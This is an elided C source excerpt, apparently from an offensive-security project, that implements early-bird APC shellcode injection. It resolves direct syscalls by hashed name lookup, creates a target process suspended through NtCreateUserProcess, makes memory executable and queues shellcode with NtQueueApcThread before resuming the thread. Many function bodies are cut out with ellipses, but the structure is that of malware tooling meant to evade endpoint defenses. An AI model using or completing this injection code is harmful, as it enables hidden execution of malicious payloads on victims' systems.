...
BOOL CreateSuspendedProcess(IN PVX_TABLE pTable, IN PWSTR szTargetProcess, IN PWSTR szTargetProcessParameters, IN PWSTR szTargetProcessPath, OUT PHANDLE hProcess, OUT PHANDLE hThread) {
	...
	PrepareSyscall(pTable->NtCreateUserProcess.wSystemCall);
...
BOOL Inject(IN PVX_TABLE pTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSize) {
	...
	OKAY("[ 0x%p ] [--X] Memory protection changed.", pAddress);

	// Queue asynchronous procedure call
	// https://ntdoc.m417z.com/ntqueueapcthread
	PrepareSyscall(pTable->NtQueueApcThread.wSystemCall); 
	...
	OKAY("[ 0x%p ] Thread resumed.", hThread);
...
int main(int argc, char* argv[]) {
	...
	if (!CreateSuspendedProcess(&Table, TARGET_PROCESS, PROCESS_PARAMS, PROCESS_PATH, &hProcess, &hThread)) {
		PRINT_ERROR("CreateSuspendedProcess");
		return EXIT_FAILURE;
	}
	OKAY("[ 0x%p ] Process created with CREATE_SUSPENDED flag.", hProcess);
...
BOOL InitializeDirectSyscalls(IN PVX_TABLE Table) {
	...
	Table->NtCreateUserProcess.dwHash = NtCreateUserProcess_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtCreateUserProcess)) {
		PRINT_ERROR("GetVxTableEntry [NtCreateUserProcess]");
		return FALSE;
	}
	...
	Table->NtQueueApcThread.dwHash = NtQueueApcThread_HASH;
